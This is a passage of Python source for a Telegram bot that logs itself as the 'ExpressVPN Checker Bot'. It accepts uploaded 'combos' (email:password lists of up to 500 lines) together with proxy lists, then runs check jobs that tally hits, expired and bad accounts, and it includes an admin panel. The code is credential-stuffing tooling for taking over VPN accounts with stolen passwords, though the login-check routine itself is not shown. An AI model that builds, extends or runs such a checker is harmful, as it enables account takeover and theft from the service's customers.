            reply_markup=create_proxy_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "help":
        await help_command(update, context)

    elif data == "admin_panel" and is_admin(user_id):
        status = "🔧 ACTIVE" if bot_state.is_maintenance else "✅ Off"
        text = f"""<b>⚙️ Admin Panel</b>

<b>Bot Status</b>
Maintenance: {status}
Uptime: {datetime.now() - bot_state.start_time}
Total checks: {bot_state.total_checks:,}
Total hits: {bot_state.total_hits:,}
Users: {len(bot_state.users)}
Errors logged: {len(bot_state.error_log)}
"""
        await query.edit_message_text(
            text,
            reply_markup=create_admin_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "admin_stats" and is_admin(user_id):
        text = f"""<b>📊 Detailed Stats</b>

<b>Global</b>
Total checks: {bot_state.total_checks:,}
Total hits: {bot_state.total_hits:,}
Active users: {len(bot_state.users)}

<b>Uptime:</b> {datetime.now() - bot_state.start_time}
"""
        await query.edit_message_text(
            text,
            reply_markup=create_admin_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "admin_users" and is_admin(user_id):
        user_list = sorted(bot_state.users.keys())
        text = f"""<b>👥 Users ({len(user_list)})</b>

"""
        for i, uid in enumerate(user_list[:20], 1):
            state = bot_state.get_user(uid)
            prog = state.progress
            text += f"{i}. ID: <code>{uid}</code> - {prog.get('total', 0)} checks\n"

        if len(user_list) > 20:
            text += f"\n<i>... and {len(user_list) - 20} more</i>"

        await query.edit_message_text(
            text,
            reply_markup=create_admin_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "toggle_maintenance" and is_admin(user_id):
        bot_state.is_maintenance = not bot_state.is_maintenance
        status = "🔧 ACTIVE" if bot_state.is_maintenance else "✅ Off"
        await query.edit_message_text(
            f"<b>Maintenance Mode</b>\n\nStatus: {status}",
            reply_markup=create_admin_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "error_log" and is_admin(user_id):
        if not bot_state.error_log:
            await query.edit_message_text(
                "📋 <b>Error Log</b>\n\nNo errors logged.",
                reply_markup=create_admin_menu(),
                parse_mode=ParseMode.HTML
            )
            return

        log_text = "<b>📋 Error Log (Last 20)</b>\n\n"
        for entry in bot_state.error_log[-20:]:
            log_text += f"• {entry}\n"

        await query.edit_message_text(
            log_text,
            reply_markup=create_admin_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "reset_stats" and is_admin(user_id):
        bot_state.total_checks = 0
        bot_state.total_hits = 0
        for state in bot_state.users.values():
            state.progress = {"total": 0, "hits": 0, "expired": 0, "bad": 0, "errors": 0}
        await query.edit_message_text(
            "🔄 <b>Stats Reset</b>\n\nAll statistics have been reset.",
            reply_markup=create_admin_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "cancel_check":
        if user_state.is_processing and user_state.current_job:
            user_state.current_job.is_running = False
            user_state.is_processing = False
            await query.edit_message_text(
                "🛑 <b>Check Cancelled</b>",
                reply_markup=create_main_menu(user_id),
                parse_mode=ParseMode.HTML
            )
        else:
            await query.edit_message_text(
                "No active check to cancel.",
                reply_markup=create_main_menu(user_id),
                parse_mode=ParseMode.HTML
            )

    else:
        await query.edit_message_text(
            "Unknown command.",
            reply_markup=create_main_menu(user_id)
        )

# ── File and Text Handlers ──────────────────────────────────────────────

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_allowed(user_id):
        await update.message.reply_text("🚫 Access denied.")
        return

    if bot_state.is_maintenance and not is_admin(user_id):
        await update.message.reply_text("🔧 Bot is in maintenance mode.")
        return

    user_state = bot_state.get_user(user_id)
    expecting_proxies = context.user_data.get('expecting_proxies', False)
    expecting_combos = context.user_data.get('expecting_combos', False)

    document = update.message.document
    if not document:
        await update.message.reply_text("Please send a valid file.")
        return

    try:
        file = await context.bot.get_file(document.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')
    except Exception as e:
        logger.error(f"Failed to download file: {e}")
        await update.message.reply_text(f"⚠️ Failed to read file: {str(e)[:50]}")
        return

    if expecting_proxies:
        proxies = parse_proxy_file(text)
        if not proxies:
            await update.message.reply_text(
                "❌ No valid proxies found in the file.\nFormat: host:port or user:pass@host:port"
            )
            return

        user_state.proxies.extend(proxies)
        user_state.proxies = list(dict.fromkeys(user_state.proxies))

        await update.message.reply_text(
            f"✅ <b>Proxies Imported</b>\n\nImported: {len(proxies)} proxies\nTotal: {len(user_state.proxies)} proxies",
            reply_markup=create_proxy_menu(),
            parse_mode=ParseMode.HTML
        )
        context.user_data['expecting_proxies'] = False

    elif expecting_combos or document.file_name.endswith('.txt'):
        combos = [line.strip() for line in text.splitlines() if line.strip() and ':' in line]
        if not combos:
            await update.message.reply_text(
                "❌ No valid combos found.\nFormat: email:password (one per line)"
            )
            return

        if len(combos) > 500:
            await update.message.reply_text(
                f"⚠️ Too many accounts ({len(combos)}).\nPlease split into smaller files (max 500)."
            )
            return

        if not rate_limiter.is_allowed(user_id):
            await update.message.reply_text(
                f"⏳ <b>Rate Limit Exceeded</b>\n\nMaximum {RATE_LIMIT_PER_MINUTE} checks per minute.",
                parse_mode=ParseMode.HTML
            )
            return

        if user_state.is_processing:
            await update.message.reply_text(
                "⏳ Already processing a check!",
                reply_markup=create_main_menu(user_id)
            )
            return

        await update.message.reply_text(
            f"✅ <b>Starting check for {len(combos)} accounts</b>\n\n🔄 Processing...",
            parse_mode=ParseMode.HTML
        )

        job = CheckJob(user_id, combos, user_state.proxies.copy(), update.message)
        user_state.current_job = job
        user_state.is_processing = True
        context.user_data['expecting_combos'] = False

        asyncio.create_task(process_job(job, context))

    else:
        await update.message.reply_text(
            "📄 <b>Unsupported File</b>\n\nPlease send a .txt file with accounts or proxies.",
            reply_markup=create_main_menu(user_id),
            parse_mode=ParseMode.HTML
        )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_allowed(user_id):
        await update.message.reply_text("🚫 Access denied.")
        return

    if bot_state.is_maintenance and not is_admin(user_id):
        await update.message.reply_text("🔧 Bot is in maintenance mode.")
        return

    expecting_combos = context.user_data.get('expecting_combos', False)

    if not expecting_combos:
        await update.message.reply_text(
            "Use the buttons to navigate or send a .txt file.",
            reply_markup=create_main_menu(user_id)
        )
        return

    user_state = bot_state.get_user(user_id)

    text = update.message.text
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    combos = [line for line in lines if ':' in line]

    if not combos:
        await update.message.reply_text(
            "❌ No valid combos found.\nFormat: <code>email:password</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if len(combos) > 200:
        await update.message.reply_text(
            f"⚠️ Too many combos ({len(combos)}).\nPlease send a .txt file instead."
        )
        return

    if not rate_limiter.is_allowed(user_id):
        await update.message.reply_text(
            "⏳ Rate limit exceeded. Please wait a moment.",
            parse_mode=ParseMode.HTML
        )
        return

    if user_state.is_processing:
        await update.message.reply_text(
            "⏳ Already processing a check!",
            reply_markup=create_main_menu(user_id)
        )
        return

    await update.message.reply_text(
        f"✅ Starting check for {len(combos)} accounts...",
        parse_mode=ParseMode.HTML
    )

    job = CheckJob(user_id, combos, user_state.proxies.copy(), update.message)
    user_state.current_job = job
    user_state.is_processing = True
    context.user_data['expecting_combos'] = False

    asyncio.create_task(process_job(job, context))

# ── Error Handler ──────────────────────────────────────────────────────────

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

    error_str = str(context.error)
    bot_state.error_log.append(f"{datetime.now().strftime('%H:%M:%S')} - {error_str[:100]}")
    if len(bot_state.error_log) > 1000:
        bot_state.error_log = bot_state.error_log[-500:]

    if update and update.effective_user:
        try:
            await context.bot.send_message(
                chat_id=update.effective_user.id,
                text="⚠️ An error occurred. Please try again."
            )
        except Exception:
            pass

# ── Main Application ──────────────────────────────────────────────────────

def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_error_handler(error_handler)

    logger.info("🚀 Starting ExpressVPN Checker Bot...")
    logger.info(f"👥 Admin: {ADMIN_IDS[0]}")
    logger.info(f"📊 Rate limit: {RATE_LIMIT_PER_MINUTE}/min")
    logger.info(f"🔧 Max threads: {MAX_THREADS}")

    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True
    )

if __name__ == "__main__":
    main()